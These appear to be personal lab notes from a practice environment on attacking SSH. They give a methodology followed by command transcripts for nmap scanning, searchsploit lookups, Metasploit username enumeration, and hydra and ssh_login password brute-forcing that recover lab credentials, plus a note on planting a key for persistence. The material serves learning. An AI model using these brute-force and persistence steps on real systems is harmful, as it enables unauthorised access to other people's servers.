┌──(kali㉿kali)-[~]
└─$ `ls /usr/share/nmap/scripts | grep ssh`
ssh2-enum-algos.nse
ssh-auth-methods.nse
ssh-brute.nse
ssh-hostkey.nse
ssh-publickey-acceptance.nse
ssh-run.nse
sshv1.nse
                                                                                                                                                                                                                                           
msf5 > `search auxiliary/scanner/ssh`

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank    Check  Description
   -   ----                                                  ---------------  ----    -----  -----------
   0   auxiliary/scanner/ssh/apache_karaf_command_execution  2016-02-09       normal  No     Apache Karaf Default Credentials Command Execution
   1   auxiliary/scanner/ssh/cerberus_sftp_enumusers         2014-05-27       normal  No     Cerberus FTP Server SFTP Username Enumeration
   2   auxiliary/scanner/ssh/detect_kippo                                     normal  No     Kippo SSH Honeypot Detector
   3   auxiliary/scanner/ssh/eaton_xpert_backdoor            2018-07-18       normal  No     Eaton Xpert Meter SSH Private Key Exposure Scanner
   4   auxiliary/scanner/ssh/fortinet_backdoor               2016-01-09       normal  No     Fortinet SSH Backdoor Scanner
   5   auxiliary/scanner/ssh/juniper_backdoor                2015-12-20       normal  No     Juniper SSH Backdoor Scanner
   6   auxiliary/scanner/ssh/karaf_login                                      normal  No     Apache Karaf Login Utility
   7   auxiliary/scanner/ssh/libssh_auth_bypass              2018-10-16       normal  No     libssh Authentication Bypass Scanner
   8   auxiliary/scanner/ssh/ssh_enum_git_keys                                normal  No     Test SSH Github Access
   9   auxiliary/scanner/ssh/ssh_enumusers                                    normal  No     SSH Username Enumeration
   10  auxiliary/scanner/ssh/ssh_identify_pubkeys                             normal  No     SSH Public Key Acceptance Scanner
   11  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner
   12  auxiliary/scanner/ssh/ssh_login_pubkey                                 normal  No     SSH Public Key Login Scanner
   13  auxiliary/scanner/ssh/ssh_version                                      normal  No     SSH Version Scanner

# Typpical Enumeration Approach

1. Enumerate Version and default scripts, algotithm supported, hostkey
2. Searching using Seachsploit to see is there is an exploit available for this version
3. Find out what auth type is supported
2. Find out if guest user access is allowed without password basically check if anonymous access is allowed
4. finding possible users using wordlist by metasploit module
5. If we have some users name then Finding password for those users using hydra, metasploit
4. If we dont get any user using wordlist, then we need to bruteforce using username and pasword diffrent wordlists



root@attackdefense:~# `nmap 192.156.74.3 -p 22 -sC -sV`
root@attackdefense:~# `nc 192.238.103.3 22`
root@attackdefense:~# `nmap 192.242.197.3 -p 22 --script ssh2-enum-algos`
root@attackdefense:~# `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
root@attackdefense:~# `searchsploit openssh `
root@attackdefense:~# `nmap 192.156.74.3 -p 22 --script ssh-auth-methods`
root@attackdefense:~# `ssh 192.156.74.3`
root@attackdefense:~# `ssh guest@192.156.74.3`
msf5 auxiliary(`scanner/ssh/ssh_enumusers`) >
msf5 auxiliary(`scanner/ssh/ssh_login`) > 
root@attackdefense:~# `hydra -l sysadmin -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.156.74.3 ssh`

# Questions

-`how can RSA full key benefit attacker`
   - Answer : 

A SSH host key is conceptually similar to a server certificate in HTTPS. It is considered easily obtainable public information, not secret. There is not really anything you could do with this in terms of attacking the system.

Only if the key is very very weak (like RSA 512 bit) or known to be compromised you could try to find a matching private key to it and then impersonate the server in a MITM attack. But it is a) very unlikely that this is the case and b) if this is the case then the system is likely much more broken, so there are easier attacks than SSH MITM.

-`how determining algo can help attacker`
   - Answer: In case we are able to get initial access after exploitation, then we can generate our own key pair and put/copy our public key into target server, while generating key pair using ssh-keygen on our machine we need to specify algorithm for key encryption the above info is useful in that contenxt .This is basically useful to create persistence and later ssh using our own private key to get ssh access again anytime.

****************************************************************************************************************************************************************

root@attackdefense:~# `nmap 192.156.74.3 -p 22 -sC -sV`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-02 06:34 UTC
Nmap scan report for target-1 (192.156.74.3)
Host is up (0.000067s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f0:b2:5c:2a:db:13:d8:2f:3f:55:18:6d:3a:ec:01:16 (RSA)
|   256 ba:94:13:05:a5:f3:38:85:52:3d:b2:c6:57:70:29:4e (ECDSA)
|_  256 da:e9:b0:5b:83:2e:62:04:76:50:8a:02:4c:64:42:bc (ED25519)
MAC Address: 02:42:C0:9C:4A:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
root@attackdefense:~# 

root@attackdefense:~# `nc 192.238.103.3 22`
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.6

root@attackdefense:~# `nmap 192.242.197.3 -p 22 --script ssh2-enum-algos`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-02 07:19 UTC
Nmap scan report for target-1 (192.242.197.3)
Host is up (0.000050s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh2-enum-algos: 
|   kex_algorithms: (10)
|       curve25519-sha256
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
MAC Address: 02:42:C0:F2:C5:03 (Unknown)

root@attackdefense:~# `nmap 192.238.103.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-08 06:00 UTC
Nmap scan report for target-1 (192.238.103.3)
Host is up (0.000032s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1fkJK7F8yxf3vewEcLYHljBnKTAiRqzFxkFo6lqyew73ATL2Abyh6at/oOmBSlPI90rtAMA6jQGJ+0HlHgf7mkjz5+CBo9j2VPu1bejYtcxpqpHcL5Bp12wgey1zup74fgd+yOzILjtgbnDOw1+HSkXqN79d+4BnK0QF6T9YnkHvBhZyjzIDmjonDy92yVBAIoB6Rdp0w7nzFz3aN9gzB5MW/nSmgc4qp7R6xtzGaqZKp1H3W3McZO3RELjGzvHOdRkAKL7n2kyVAraSUrR0Oo5m5e/sXrITYi9y0X6p2PTUfYiYvgkv/3xUF+5YDDA33AJvv8BblnRcRRZ74BxaD
|   ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB0cJ/kSOXBWVIBA2QH4UB6r7nFL5l7FwHubbSZ9dIs2JSmn/oIgvvQvxmI5YJxkdxRkQlF01KLDmVgESYXyDT4=
|_  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKuZlCFfTgeaMC79zla20ZM2q64mjqWhKPw/2UzyQ2W/
MAC Address: 02:42:C0:EE:67:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds

root@attackdefense:~# `searchsploit openssh `
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                                                                    |  Path
                                                                                                                                                                                                  | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation                                                                                                                              | exploits/linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service                                                                                                                                | exploits/multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution                                                                                                                                                  | exploits/freebsd/remote/17462.txt
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                                                                                                                                            | exploits/linux/local/258.sh
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                                                                                                                                | exploits/novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                                                                                                                                                        | exploits/linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                                                          | exploits/linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                                                                    | exploits/linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                                                                                                                                 | exploits/unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                                                                                                                                        | exploits/linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                                                                                                                              | exploits/unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                                                                                                                              | exploits/unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                                                                                                                                        | exploits/multiple/dos/2444.sh
OpenSSH < 6.6 SFTP - Command Execution                                                                                                                                                            | exploits/linux/remote/45001.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                                                                                                                                      | exploits/linux_x86-64/remote/45000.c
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                                                                                                                                              | exploits/linux/local/41173.c
OpenSSH 7.2 - Denial of Service                                                                                                                                                                   | exploits/linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                                                                                           | exploits/multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                                                                                              | exploits/linux/remote/40136.py
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                                                          | exploits/linux/remote/40963.txt
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                                                              | exploits/linux/local/40962.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                                                              | exploits/linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                                                                                             | exploits/linux/remote/40113.txt
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                                                                                                                               | exploits/linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                                                                                                                                 | exploits/linux/remote/25.c
OpenSSH SCP Client - Write Arbitrary Files                                                                                                                                                        | exploits/multiple/remote/46516.py
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                                                                                                                              | exploits/multiple/remote/3303.sh
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------------
 Paper Title                                                                                                                                                                               |  Path
                                                                                                                                                                                           | (/usr/share/exploitdb-papers/)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------------
Roaming Through the OpenSSH Client: CVE-2016-0777 and CVE-2016-0778                                                                                                                        | papers/english/39247-roaming-through-the-opens
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -----------------------------------------------
root@attackdefense:~# 

root@attackdefense:~# `nmap 192.156.74.3 -p 22 --script ssh-auth-methods`
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-02 06:42 UTC
Nmap scan report for target-1 (192.156.74.3)
Host is up (0.000066s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
MAC Address: 02:42:C0:9C:4A:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
root@attackdefense:~# 

root@attackdefense:~# `ssh 192.156.74.3`
root@192.156.74.3's password: 
Permission denied, please try again.
root@192.156.74.3's password: 
Permission denied, please try again.
root@192.156.74.3's password: 
root@192.156.74.3: Permission denied (publickey,password).
root@attackdefense:~# 
root@attackdefense:~# `ssh guest@192.156.74.3`
guest@192.156.74.3's password: 
Permission denied, please try again.
guest@192.156.74.3's password: 
Permission denied, please try again.
guest@192.156.74.3's password: 
guest@192.156.74.3: Permission denied (publickey,password).
root@attackdefense:~# 

msf5 auxiliary(scanner/ssh/ssh_enumusers) > `options`

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CHECK_FALSE  false            no        Check for false positives (random username)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        22               yes       The target port
   THREADS      1                yes       The number of concurrent threads (max one per host)
   THRESHOLD    10               yes       Amount of seconds needed before a user is considered found (timing attack only)
   USERNAME                      no        Single username to test (username spray)
   USER_FILE                     no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet


msf5 auxiliary(scanner/ssh/ssh_enumusers) > `set RHOSTS 192.156.74.3`
RHOSTS => 192.156.74.3
msf5 auxiliary(scanner/ssh/ssh_enumusers) > `run`

[*] 192.156.74.3:22 - SSH - Using malformed packet technique
[-] Please populate USERNAME or USER_FILE
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ssh/ssh_enumusers) > run

[*] 192.156.74.3:22 - SSH - Using malformed packet technique
[*] 192.156.74.3:22 - SSH - Starting scan
[+] 192.156.74.3:22 - SSH - User 'sysadmin' found
[+] 192.156.74.3:22 - SSH - User 'rooty' found
[+] 192.156.74.3:22 - SSH - User 'demo' found
[+] 192.156.74.3:22 - SSH - User 'auditor' found
[+] 192.156.74.3:22 - SSH - User 'anon' found
[+] 192.156.74.3:22 - SSH - User 'administrator' found
[+] 192.156.74.3:22 - SSH - User 'diag' found
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > `set RHOSTS 192.156.74.3`
RHOSTS => 192.156.74.3
msf5 auxiliary(scanner/ssh/ssh_login) > `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/common_passwords.txt   
msf5 auxiliary(scanner/ssh/ssh_login) > `set USERNAME administrator`
USERNAME => administrator
msf5 auxiliary(scanner/ssh/ssh_login) > `run`

[+] 192.156.74.3:22 - Success: 'administrator:password1' ''
[*] Command shell session 1 opened (192.156.74.2:37833 -> 192.156.74.3:22) at 2024-01-02 06:33:21 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

root@attackdefense:~# `hydra -l sysadmin -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.156.74.3 ssh`
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-02 06:33:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50 login tries (l:1/p:50), ~4 tries per task
[DATA] attacking ssh://192.156.74.3:22/
[22][ssh] host: 192.156.74.3   login: sysadmin   password: hailey
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-02 06:33:29

# We get two users
'administrator:password1' 
login: sysadmin   password: hailey